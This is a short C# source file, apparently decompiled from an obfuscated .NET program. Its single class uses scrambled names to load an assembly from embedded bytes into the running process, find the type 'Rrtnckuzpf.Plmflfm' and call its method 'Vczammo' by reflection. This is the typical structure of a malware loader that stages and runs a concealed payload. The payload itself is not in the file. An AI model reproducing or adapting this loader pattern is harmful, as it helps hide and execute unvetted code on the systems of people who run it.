using System;
using System.Reflection;
using System.Threading;

internal sealed class ief
{
	private sealed class tiy
	{
		public ief esm;

		public string esn;

		internal object qaz()
		{
			return ((Type)esm.rvx()).GetMethod(esn) ?? null;
		}
	}

	private sealed class tiz
	{
		public object ime;

		internal object hfb()
		{
			return ((Assembly)ime).GetType("Rrtnckuzpf.Plmflfm");
		}
	}

	internal object rvw()
	{
		return new Func<object>(new tiy
		{
			esm = this,
			esn = "Vczammo"
		}.qaz)();
	}

	internal object rvx()
	{
		object enw = rvy();
		return rvz(enw);
	}

	internal object rvy()
	{
		return Thread.GetDomain().Load(ieh.ory());
	}

	internal object rvz(object enw)
	{
		return new Func<object>(new tiz
		{
			ime = enw
		}.hfb)();
	}

	internal Action rwa()
	{
		return (Action)new Func<object>(rwb)();
	}

	private object rwb()
	{
		return ((MethodInfo)rvw()).DeclaringType!.InvokeMember("Vczammo", BindingFlags.InvokeMethod, null, null, null);
	}
}
